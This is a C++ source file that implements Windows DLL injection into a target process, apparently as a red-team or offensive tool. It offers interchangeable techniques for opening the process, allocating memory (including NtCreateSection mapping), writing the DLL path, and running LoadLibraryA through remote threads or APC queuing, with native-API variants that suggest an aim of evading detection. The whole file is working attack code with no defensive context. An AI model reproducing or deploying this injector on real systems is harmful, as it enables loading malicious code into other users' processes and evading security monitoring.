#include "header.h"
#include "ntapi.h"
#include "inject.h"
#include <vector>

using namespace std;

DWORD OPENPROCESS = 1, NTOPENPROCESS = 2, OPENTHREAD = 1, NTOPENTHREAD = 2;
DWORD VIRTUALALLOC2 = 1, VIRTUALALLOCEX = 2, NTALLOCATEVIRTUALMEMORY = 3, NTCREATESECTION = 4;
DWORD WRITEPROCESSMEMORY = 1, NTWRITEVIRTUALMEMORY = 2, RTLCOPYMEMORY = 3;
DWORD CREATEREMOTETHREAD = 1, NTCREATETHREADEX = 2, QUEUEUSERAPC = 3, NTQUEUEAPCTHREAD = 4, RTLCREATEUSERTHREAD = 5;
DWORD RESUMETHREAD = 1, NTRESUMETHREAD = 2, NTALERTRESUMETHREAD = 3;
PVOID RemoteAddress = nullptr;

vector<DWORD> GetProcessThreads(DWORD pid) {

	vector<DWORD> tids;
	HANDLE hThreadSnap;
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap) {
		THREADENTRY32 ThreadEntry32;
		ZeroMemory(&ThreadEntry32, sizeof(ThreadEntry32));
		ThreadEntry32.dwSize = sizeof(ThreadEntry32);
		if (Thread32First(hThreadSnap, &ThreadEntry32)) {

			do {
				if (ThreadEntry32.th32OwnerProcessID == pid) {
					tids.push_back(ThreadEntry32.th32ThreadID);
				}
			} while (Thread32Next(hThreadSnap, &ThreadEntry32));
		}

	}

	CloseHandle(hThreadSnap);
	return tids;
}

BOOL GetProcessHandle(DWORD pid, DWORD OPENPROCESS_TECH, PHANDLE hProcess) {
	if (OPENPROCESS_TECH == OPENPROCESS) {
		//*hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);
		*hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, NULL, pid);
		if (*hProcess == INVALID_HANDLE_VALUE) {
			printf("[-] Failed to get Process Handle: %d", GetLastError());
			return FALSE;
		}
		return TRUE;
	}

	if (OPENPROCESS_TECH == NTOPENPROCESS) {
		pNtOpenProcess fpNtOpenProcess = (pNtOpenProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenProcess");
		if (!fpNtOpenProcess) {
			printf("[-] Could not fetch NtOpenProcess address\n");
			return FALSE;
		}
		printf("[+] NtOpenProcess Address: 0x%p\n", fpNtOpenProcess);
		CLIENT_ID ClientId;
		OBJECT_ATTRIBUTES ObjectAttributes;
		InitializeObjectAttributes(&ObjectAttributes, NULL, NULL, NULL, NULL);
		ClientId.UniqueProcess = (PVOID)pid;
		ClientId.UniqueThread = (PVOID)0;
		if (!NT_SUCCESS(fpNtOpenProcess(hProcess, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, &ObjectAttributes, &ClientId))) {
			printf("[-] Failed to get Process Handle: %d", GetLastError());
			return FALSE;
		}
		return TRUE;
	}
}

PVOID GetMemoryAllocation(HANDLE hProcess, DWORD DLLPathLength, DWORD MEMALLOC_TECH) {
	printf("Memory Allocated Selected %d\n", MEMALLOC_TECH);
	PVOID AllocatedMemory = nullptr;
	if (MEMALLOC_TECH == NTCREATESECTION) {
		pNtCreateSection fpNtCreateSection = (pNtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
		if (!fpNtCreateSection) {
			printf("[-] Failed to get address of NtCreateSection: %d", GetLastError());
			return nullptr;
		}
		pNtMapViewOfSection fpNtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection");
		if (!fpNtMapViewOfSection) {
			printf("[-] Failed to get address of NtMapViewOfSection: %d", GetLastError());
			return nullptr;
		}
		LARGE_INTEGER SectionSize;
		SectionSize.HighPart = 0;
		SectionSize.LowPart = DLLPathLength;
		HANDLE hSection = NULL;
		NTSTATUS ntstatus;
		ntstatus = fpNtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&SectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
		if(!NT_SUCCESS(ntstatus)) {
			printf("[-] Failed to create Section %x\n", ntstatus);
			return nullptr;
		}
		ntstatus = fpNtMapViewOfSection(hSection, GetCurrentProcess(), &AllocatedMemory, NULL, NULL, NULL, &DLLPathLength, 2, NULL, PAGE_READWRITE);
		if (!NT_SUCCESS(ntstatus)) {
			printf("[-] Failed to create Map View of Section in current process %x\n", ntstatus);
			return nullptr;
		}
		ntstatus = fpNtMapViewOfSection(hSection, hProcess, &RemoteAddress, NULL, NULL, NULL, &DLLPathLength, 2, NULL, PAGE_READONLY);
		if (!NT_SUCCESS(ntstatus)) {
			printf("[-] Failed to create Map View of Section in remote process %x\n", ntstatus);
			return nullptr;
		}

		return AllocatedMemory;

	}

	if (MEMALLOC_TECH == VIRTUALALLOCEX) {
		AllocatedMemory = VirtualAllocEx(hProcess, nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!AllocatedMemory) {
			printf("[-] Failed to alloacte memory using VirtualAllocEx: %d\n", GetLastError());
			return nullptr;
		}

		return AllocatedMemory;
	}

	if (MEMALLOC_TECH == NTALLOCATEVIRTUALMEMORY) {
		pNtAllocateVirtualMemory fpNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
		if (!fpNtAllocateVirtualMemory) {
			printf("[-] Failed to get address of NtAllocateVirtualMemory: %d", GetLastError());
			return nullptr;
		}

		if (!NT_SUCCESS(fpNtAllocateVirtualMemory(hProcess, &AllocatedMemory, NULL, (PULONG)&DLLPathLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE))) {
			printf("[-] Failed to allocate memory using NtAllocateVirtualMemory: %d", GetLastError());
			return nullptr;
		}

		return AllocatedMemory;
	}

	return nullptr;
}

BOOL WriteTargetProcessMemory(HANDLE hProcess, PVOID Buffer, CHAR* Payload, DWORD PayloadSize, DWORD MEMWRITE_TECH) {

	if (MEMWRITE_TECH == WRITEPROCESSMEMORY) {
		DWORD NumberofBytesWritten = 0;
		BOOL ret = WriteProcessMemory(hProcess, Buffer, Payload, PayloadSize, &NumberofBytesWritten);
		if (!ret) {
			printf("[-] Failed to write memory with WriteProcessMemory: %d\n", GetLastError());
			return FALSE;
		}

		return TRUE;
	}

	if (MEMWRITE_TECH == NTWRITEVIRTUALMEMORY) {
		DWORD NumberofBytesWritten = 0;
		pNtWriteVirtualMemory fpNtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
		if (!fpNtWriteVirtualMemory) {
			printf("[-] Failed to get address of NtAllocateVirtualMemory: %d", GetLastError());
			return FALSE;
		}
		if (!NT_SUCCESS(fpNtWriteVirtualMemory(hProcess, Buffer, Payload, (ULONG)PayloadSize, (PULONG)&NumberofBytesWritten))) {
			printf("[-] Failed to write memory with NtWriteVirtualMemory: %d\n", GetLastError());
			return FALSE;
		}
		
		return TRUE;
	}

	if (MEMWRITE_TECH == RTLCOPYMEMORY) {
		RtlCopyMemory(Buffer, Payload, PayloadSize);
		return TRUE;
	}

	return FALSE;
}

BOOL InjectDLLIntoTarget(HANDLE hProcess, PVOID Buffer, DWORD pid, DWORD INJECT_TECH, DWORD OPENTHREAD_TECH, DWORD THREADRES_TECH, DWORD MEMALLOC_TECH) {

	
	if (INJECT_TECH == CREATEREMOTETHREAD) {
		if (MEMALLOC_TECH == NTCREATESECTION) {
			Buffer = RemoteAddress;
		}
		DWORD tid;
		HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32"), "LoadLibraryA"), Buffer, NULL, &tid);
		if (!hThread) {
			printf("[-] Failed to create Thread with CreateRemoteThread: %d\n", GetLastError());
		}

		printf("[+] Thread %d Created Successfully\n", tid);
		return TRUE;
	}

	if (INJECT_TECH == RTLCREATEUSERTHREAD) {
		if (MEMALLOC_TECH == NTCREATESECTION) {
			Buffer = RemoteAddress;
		}
		HANDLE hThread = NULL;
		pRtlCreateUserThread fpRtlCreateUserThread = (pRtlCreateUserThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateUserThread");
		if (!fpRtlCreateUserThread) {
			printf("[-] Failed to get address of RtlCreateUserThread: %d", GetLastError());
			return FALSE;
		}
		NTSTATUS ntstatus;
		ntstatus = fpRtlCreateUserThread(hProcess, NULL, FALSE, NULL, NULL, NULL, GetProcAddress(GetModuleHandleA("kernel32"), "LoadLibraryA"), Buffer, &hThread, NULL);
		if (!NT_SUCCESS(ntstatus)) {
			printf("[-] Failed to create Thread with RtlCreateUserThread: %x\n", ntstatus);
			return FALSE;
		}
		DWORD tid = GetThreadId(hThread);
		printf("[+] Thread %d Created Successfully\n", tid);
		return TRUE;
	}

	if (INJECT_TECH == NTCREATETHREADEX) {
		if (MEMALLOC_TECH == NTCREATESECTION) {
			Buffer = RemoteAddress;
		}
		NtCreateThreadExBuffer NtBuffer;
		pNtCreateThreadEx fpNtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
		if (!fpNtCreateThreadEx) {
			printf("[-] Failed to get address of NtCreateThreadEx: %d", GetLastError());
			return FALSE;
		}

		memset(&NtBuffer, 0, sizeof(NtCreateThreadExBuffer));
		ULONG temp0[2];
		ULONG temp1;
		NtBuffer.Size = sizeof(NtCreateThreadExBuffer);
		NtBuffer.Unknown1 = 0x10003;
		NtBuffer.Unknown2 = sizeof(temp0);
		NtBuffer.Unknown3 = temp0;
		NtBuffer.Unknown4 = 0;
		NtBuffer.Unknown5 = 0x10004;
		NtBuffer.Unknown6 = sizeof(temp1);
		NtBuffer.Unknown7 = &temp1;
		NtBuffer.Unknown8 = 0;

		HANDLE hThread;
		NTSTATUS ntstatus;
		ntstatus = fpNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, nullptr, hProcess,
		(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32"), "LoadLibraryA"), Buffer, NULL, NULL, NULL, NULL, nullptr);
		if(!NT_SUCCESS(ntstatus)){
			printf("[-] Failed to create Thread using NtCreateThreadEx: %x\n", ntstatus);
			return FALSE;
		}
		DWORD tid = GetThreadId(hThread);
		printf("[+] Thread %d Created Successfully\n", tid);
		return TRUE;
	}
	
	if (INJECT_TECH == QUEUEUSERAPC) {
		if (MEMALLOC_TECH == NTCREATESECTION) {
			Buffer = RemoteAddress;
		}
		auto tids = GetProcessThreads(pid);
		if (tids.empty()) {
			printf("[-] Failed to get Process Threads\n");
			return FALSE;
		}
		
		for (const DWORD tid : tids) {
			HANDLE hThread = 0;
			if (OPENTHREAD_TECH == OPENTHREAD) {
				 hThread = OpenThread(THREAD_SET_CONTEXT, NULL, tid);
			}
			else if (OPENTHREAD_TECH == NTOPENTHREAD){
				hThread = NtOpenThread(pid, tid);
			}

			if (!hThread) {
				printf("[-] Failed to Open Thread: %d\n", GetLastError());
				return FALSE;
			}

			QueueUserAPC((PAPCFUNC)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"), hThread, (ULONG_PTR)Buffer);
			if (THREADRES_TECH == RESUMETHREAD) {
				ResumeThread(hThread);
			}
			else if (THREADRES_TECH == NTRESUMETHREAD) {
				pNtResumeThread fpNtResumeThread = (pNtResumeThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtResumeThread");
				if (!fpNtResumeThread) {
					printf("[-] Failed to get address NtResumeThread: %d", GetLastError());
				}
				else {
					fpNtResumeThread(hThread, NULL);
				}
			}
			else if (THREADRES_TECH == NTALERTRESUMETHREAD) {
				pNtAlertResumeThread fpNtAlertResumeThread = (pNtAlertResumeThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtResumeThread");
				if (!fpNtAlertResumeThread) {
					printf("[-] Failed to get address NtResumeThread: %d", GetLastError());
				}
				else {
					fpNtAlertResumeThread(hThread, NULL);
				}
			}
			CloseHandle(hThread);
			
		}
		printf("[+] APC Queued Successfully with QueueUserAPC\n");
		return TRUE;
	}

	if (INJECT_TECH == NTQUEUEAPCTHREAD) {
		if (MEMALLOC_TECH == NTCREATESECTION) {
			Buffer = RemoteAddress;
		}
		auto tids = GetProcessThreads(pid);
		if (tids.empty()) {
			printf("[-] Failed to get Process Threads\n");
			return FALSE;
		}

		for (const DWORD tid : tids) {
			HANDLE hThread = 0;
			if (OPENTHREAD_TECH == OPENTHREAD) {
				hThread = OpenThread(THREAD_SET_CONTEXT, NULL, tid);
			}
			else if (OPENTHREAD_TECH == NTOPENTHREAD) {
				hThread = NtOpenThread(pid, tid);
			}

			if (!hThread) {
				printf("[-] Failed to Open Thread: %d\n", GetLastError());
				return FALSE;
			}

			pNtSuspendThread fpNtSuspendThread = (pNtSuspendThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSuspendThread");
			if (!fpNtSuspendThread) {
				printf("[-] Failed to get address of NtSuspenseThread: %d", GetLastError());
				return FALSE;
			}
			fpNtSuspendThread(hThread, NULL);
			pNtQueueApcThread fpNtQueueApcThread = (pNtQueueApcThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueueApcThread");
			if (!fpNtQueueApcThread) {
				printf("[-] Failed to get address of NtQueueApcThread: %d", GetLastError());
				return FALSE;
			}
			fpNtQueueApcThread(hThread, (PIO_APC_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"), Buffer, NULL, NULL);
			if (THREADRES_TECH == RESUMETHREAD) {
				ResumeThread(hThread);
			}
			else if (THREADRES_TECH == NTRESUMETHREAD) {
				pNtResumeThread fpNtResumeThread = (pNtResumeThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtResumeThread");
				if (!fpNtResumeThread) {
					printf("[-] Failed to get address NtResumeThread: %d", GetLastError());
				}
				else {
					fpNtResumeThread(hThread, NULL);
				}
			}
			else if (THREADRES_TECH == NTALERTRESUMETHREAD) {
				pNtAlertResumeThread fpNtAlertResumeThread = (pNtAlertResumeThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtResumeThread");
				if (!fpNtAlertResumeThread) {
					printf("[-] Failed to get address NtResumeThread: %d", GetLastError());
				}
				else {
					fpNtAlertResumeThread(hThread, NULL);
				}
			}
			CloseHandle(hThread);

		}
		printf("[+] APC Queued Successfully with NtQueueApcThread\n");
		return TRUE;
	}

	return FALSE;
}

BOOL InjectionProcedure(DWORD pid, CHAR* DLLPath, DWORD OPENPROCESS_TECH, DWORD OPENTHREAD_TECH, DWORD MEMALLOC_TECH, DWORD MEMWRITE_TECH, DWORD INJECT_TECH, DWORD THREADRES_TECH) {

	HANDLE hProcess;
	if (GetProcessHandle(pid, OPENPROCESS_TECH, &hProcess)) {
		printf("[+] Process Handle Value: 0x%p\n", hProcess);
	}
	
	PVOID AllocatedMemory = nullptr;
	DWORD DLLPathLength = strlen(DLLPath) + 1;
	if (AllocatedMemory = GetMemoryAllocation(hProcess, DLLPathLength, MEMALLOC_TECH)) {
		if (MEMALLOC_TECH == NTCREATESECTION) {
			printf("[+] Allocated Remote Memory Address: 0x%p\n", RemoteAddress);
		}
		printf("[+] Allocated Memory Address: 0x%p\n", AllocatedMemory);
	}

	if (WriteTargetProcessMemory(hProcess, AllocatedMemory, DLLPath, DLLPathLength, MEMWRITE_TECH)) {
		printf("[+] DLL Path written in the target Process Memory\n");
	}

	if (InjectDLLIntoTarget(hProcess, AllocatedMemory, pid, INJECT_TECH, OPENTHREAD_TECH, THREADRES_TECH, MEMALLOC_TECH)) {
		printf("[+] Process Injection Done Successfully\n");
	}

	if(AllocatedMemory)VirtualFreeEx(hProcess, AllocatedMemory, DLLPathLength, MEM_RELEASE);
	if (RemoteAddress)VirtualFreeEx(hProcess, RemoteAddress, DLLPathLength, MEM_RELEASE);
	return TRUE;
}
